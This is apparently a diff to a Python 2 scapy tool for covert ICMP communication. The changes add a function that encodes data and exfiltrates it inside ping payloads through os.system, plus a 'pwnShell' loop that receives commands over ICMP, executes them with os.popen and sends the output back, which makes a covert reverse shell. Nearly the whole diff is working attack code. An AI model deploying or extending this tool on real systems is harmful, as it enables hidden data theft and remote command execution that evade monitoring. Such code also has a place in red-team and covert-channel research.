@@ -1,5 +1,5 @@
 from scapy.all import *
-import sys, base64, argparse
+import sys, base64, argparse, os
 
 def raw(p):
     return p[ICMP][Raw].load[16:32]
@@ -50,26 +50,60 @@ def lastBytesCommunication(interface):
 
     return dec
 
+def exfiltrateLastBytes(data, ip, src):
+
+    print "[*] Destination of data: {}".format(ip)
+    if src:
+        print "[*] Sending encoded file: {}".format(src)
+    else:
+        print "[*] Sending encoded message: \"{}\"".format(data)
+
+    # add final signal to stop receiving data
+    string = base64.b64encode(data).encode("hex") + "0a"
+
+    # split into blocks to send message
+    blocks = []
+    for i in range(0, len(string), 32):
+        blocks.append(string[i:i+32])
+
+    # make last block padded
+    blocks[-1] = blocks[-1] + (32 - len(blocks[-1])) * "0"
+
+    # send blocks one by one
+    for i in blocks:
+        os.system("ping -c1 -p {} {} > /dev/null".format(i, ip))
+
+    print "[*] Message sent to {}".format(ip)
+
 def server(interface, mode):
 
     received = []
 
-    for x in range(4):
+    for x in range(1):
 
         if mode == 1:
             data = lastBytesCommunication(interface)
         elif mode == 2:
             data = timeBasedCommunication(interface)
+        else:
+            return
 
         print "[*] Received data: \"{}\"".format(data)
         received.append(data)
 
     return "\n".join(received) + "\n"
 
+def pwnShell(interface, mode, receiver):
 
-def pwnShell():
+    while True:
+        if receiver:
+            data = ""
+            while data == "":
+                data = server(interface, mode)
+            cmd = os.popen(data).read()
+            exfiltrateLastBytes(cmd, "127.0.0.1", "")
 
-    #function will be called on each script
+
     """
 
     client connects to server
@@ -97,8 +131,14 @@ if __name__ == "__main__":
     print "[*] Started listener on interface: {}".format(args.interface)
     print "[*] Listening mode: {}".format(args.mode)
 
-    out = server(args.interface, args.mode)
-    
-    if args.out:
-        write(out, args.out)
-        print "[*] Exfiltrated data saved to: {}".format(args.out)
+    shell = True
+
+    if shell:
+        pwnShell(args.interface, args.mode, 1)
+
+    else:
+        out = server(args.interface, args.mode, shell)
+
+        if args.out:
+            write(out, args.out)
+            print "[*] Exfiltrated data saved to: {}".format(args.out)
